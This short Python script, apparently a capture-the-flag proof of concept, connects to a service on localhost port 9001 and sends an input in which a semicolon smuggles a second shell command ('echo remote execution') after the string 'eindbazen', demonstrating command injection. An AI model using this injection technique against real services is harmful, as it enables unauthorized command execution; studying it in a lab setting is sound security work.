import socket

s = socket.create_connection(('localhost', 9001))
s.send('eindbazen;echo remote execution \o/')
s.send('eindbazen')
